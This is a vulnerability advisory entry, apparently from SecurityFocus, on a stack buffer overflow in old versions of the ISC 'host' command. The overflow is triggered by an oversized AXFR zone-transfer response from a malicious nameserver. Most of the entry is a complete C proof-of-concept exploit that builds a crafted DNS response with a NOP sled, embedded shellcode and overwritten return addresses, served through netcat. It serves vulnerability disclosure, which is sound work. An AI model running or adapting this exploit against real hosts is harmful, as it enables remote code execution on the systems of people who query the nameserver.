source: http://www.securityfocus.com/bid/1887/info

An exploitable buffer overflow vulnerability exists in certain non-current versions of the ISC host command. 

host can be used to issue an AXFR command to effect a zone transfer for a given domain name. In affected versions of host, if the AXFR query yields a response from the server which exceeds 512 bytes in length (possible, since TCP DNS messages can be up to 65535 bytes in length), the response can overflow the relevant buffer onto the stack, allowing the return address of the function to be modified. This may allow an operator of a malicious nameserver to gain control of a system on which host is being run when a query is made.

command line:

./host -l -v -t any somezone.org <fake server>

proof of concepts exploit:

/* hostexp.c
* cc hostexp.c -o hostexp
*
* usage: ./hostexp | nc -l -p 53
*/

#include <stdio.h>
#include <netinet/in.h>

int main(void)
{
int offset = 140;
unsigned int base = 0xbffff74c+offset, i;
char shellcode[] = /* 48 bytes, ripped */
"\xeb\x22\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x31\xc0\xaa"
"\x89\xf9\x89\xf0\xab\x89\xfa\x31\xc0\xab\xb0\x08\x04"
"\x03\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff"
"\xff\xff/bin/ls";
unsigned short a = htons(1024);
char buffer[1026];

memcpy(buffer, &a, 2);
memset(buffer+2, 'A', 100); /* avoid response processing */
memset(buffer+102, 0x90, 100);
memcpy(buffer+202, shellcode, 48);
for (i = 202+48; i < 202+48+600; i+=4)
memcpy(buffer+i, &base, 4);
write(fileno(stdout), buffer, 1026);
return 0;
}